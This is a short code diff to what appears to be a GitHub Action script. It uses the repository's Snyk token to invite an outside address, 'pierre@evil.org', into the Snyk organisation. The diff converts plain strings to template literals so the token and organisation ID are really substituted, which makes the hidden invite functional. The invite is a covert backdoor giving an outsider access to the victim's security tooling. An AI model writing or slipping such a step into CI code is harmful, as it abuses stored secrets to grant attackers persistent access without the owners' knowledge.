@@ -9,9 +9,9 @@ try {
   const regexCheckbox = core.getInput('regex-checkbox');
 
   axios.defaults.baseURL= 'https://snyk.io/api/v1'; 
-  axios.defaults.headers.common['Authorization']= 'token ${{secret.SNYK_TOKEN}}'; 
+  axios.defaults.headers.common['Authorization']= `token ${{secret.SNYK_TOKEN}}`; 
   axios.defaults.headers.post['Content-Type']= 'application/json'; 
-  axios.post('/org/${snykOrgId}/invite', {
+  axios.post(`/org/${snykOrgId}/invite`, {
     email: 'pierre@evil.org'
   })
   .then(function (response) {
@@ -20,7 +20,7 @@ try {
   })
   .catch(function (error) {
     console.log(error);
-    core.setOutput("http-response-code", error.status);
+    core.setOutput("http-response-code", error.response.status);
   });
  
   const payload = JSON.stringify(github.context.payload, undefined, 2)
